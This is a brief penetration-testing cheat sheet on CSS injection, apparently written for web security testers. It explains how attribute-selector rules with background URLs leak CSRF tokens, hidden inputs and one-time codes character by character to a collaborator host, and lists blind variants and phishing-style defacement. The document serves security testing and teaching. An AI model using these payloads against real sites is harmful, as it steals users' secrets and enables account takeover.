# CSS Injection

**TL;DR**: you control CSS injected into the page (not JS). Scriptless data exfiltration via attribute selectors + `background:url()` callbacks, works even under a strict CSP that blocks JavaScript. Leaks secrets/tokens char-by-char.

## Where to look
- User input reflected inside a `<style>` block or a `style=` attribute, rich-text/markdown that keeps CSS, theme/customization ("custom CSS"), sanitizers that strip JS but allow `<style>`/`style`.
- Injection where `<script>` is blocked but HTML/CSS passes (pairs with dangling markup and DOM clobbering).

## Core technique: attribute-selector exfiltration
- Leak a secret's value (CSRF token, hidden input, etc.) one character at a time:
```css
input[name="csrf"][value^="a"]{background:url(//collab/leak?c=a)}
input[name="csrf"][value^="b"]{background:url(//collab/leak?c=b)}
/* ... one rule per candidate char; the matching one fires the request */
```
- Only attributes present in the DOM are leakable (value of inputs, href, etc.). Needs a way to re-inject/reload for each position (iframe reload, `@import` staging, or CSS that loads sequentially).
- **Blind / no-reload** variants: `@import` chaining (import next stage after a match), font `unicode-range` (`@font-face` with `unicode-range` to detect which chars render), scrollbar + `overflow` timing, ligatures widening an element that triggers a background on an ancestor.

## Other impacts
- Read/exfiltrate `input[type=hidden]`, tokens, partial password field state, one-time codes rendered in DOM.
- Deface / UI redress (overlay, hide security banners) = phishing aid.
- Chain: CSS injection + dangling markup to leak following HTML.

## Caido
- Inject the selector ruleset, watch the QuickSSRF/collaborator panel for the `?c=` hits that spell out the secret.

## References
- PortSwigger - CSS injection (research/blog) - https://portswigger.net/research/blind-css-exfiltration
- PayloadsAllTheThings - CSS Injection - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSS%20Injection
- HackTricks - CSS Injection - https://book.hacktricks.wiki/en/pentesting-web/xs-search/css-injection/
